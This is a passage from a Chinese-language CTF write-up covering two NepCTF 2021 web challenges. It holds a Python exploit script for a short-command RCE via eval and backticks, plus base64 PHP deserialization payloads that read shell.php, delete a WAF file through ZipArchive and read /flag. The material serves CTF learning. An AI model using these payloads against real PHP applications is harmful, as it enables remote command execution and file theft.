variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>非常简洁，传入两个参数然后<code>eval</code>执行，格式为</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>利用`反引号和分号;执行命令</p><p>首先看到<code>len</code>用来截断字符串<code>nep</code>，而if中<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>即长度不相等，刚开始以为需要利用整形溢出</p><blockquote><p>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p></blockquote><p>测试了一下发现不对，传入字符串视为<strong>字符串类型</strong>，并不存在整形溢出，如下</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>所以思路不对，接下来想到四字符RCE，<a href="https://blog.csdn.net/q20010619/article/details/109206728">参考文章</a>，测试了一下，问题是测试下来目录非常的杂乱</p><p>flag就在当前目录，无法准确直接cat。<strong>此脚本无效，以前的脚本直接用，仅展示</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        待续</code></pre><p>访问下v，结果仅能扫到目录</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>目录变得非常乱，于是想为何不能利用<code>*</code>直接读文件呢</p><blockquote><p>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></blockquote><p>测试如下</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>测试可行，输出一个<code>cat</code>文件，然后目录就有<code>cat</code>/<code>index.php</code>/<code>nepctf.php</code>了，然后执行<code>*&gt;a</code>，即将目录内容当作命令执行输出到文件a，cat全部文件，然后访问文件a即可</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h4><pre class="language-none"><code class="language-none">读取shell.php：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---删除waf.txt：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---读取flag：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9是不是很简单？</code></pre><p>很文艺的名字，我信了它《简单的PHP反序列化》</p><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>分析下，首先要绕<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>，直接数组绕过，传入<code>./?a[]=1&amp;b[]=a</code>即可，如下</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="读取shell-php："><a href="#读取shell-php：" class="headerlink" title="读取shell.php："></a>读取shell.php：</h5><p>看Game类</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>看到<code>__wakeup</code>第一反应可不可以直接绕，看了下版本<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124反序列化绕过wakeup漏洞。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>乖乖走<code>__wakeup</code>，register类没有作用，看来得走login类</p><p>参数<code>register</code>的md5要为<code>21232f297a57a5a743894a0e4a801fc3</code>，一查，<code>admin</code></p><p>那就没问题了，<code>__wakeup</code>将Game类的<code>file</code>/<code>filename</code>/<code>content</code>传入login，利用login的<code>__construct</code>赋值</p><p>Game类的变量choice即login类，利用Game类<code>__destruct</code>触发login类的checking函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>login类的checking函数检查赋值的username和password，即Game类传过来的username和password。然后调用file即Game类的file的open函数。由于没有<code>__call</code>之类的魔术方法，不需要考虑其他。即本题所有变量都可在Game类直接赋值。</p><p>关键点就在于Open类了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>如图所示，存在waf.txt，<code>file_get_contents</code>为true，即存在waf.txt时会<code>file_get_contents($filename.&quot;.php&quot;);</code>，否则会<code>shell($content);</code>所以我们首先要利用伪协议读取<code>shell.php</code>的内容。</p><p>exp1.php如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token 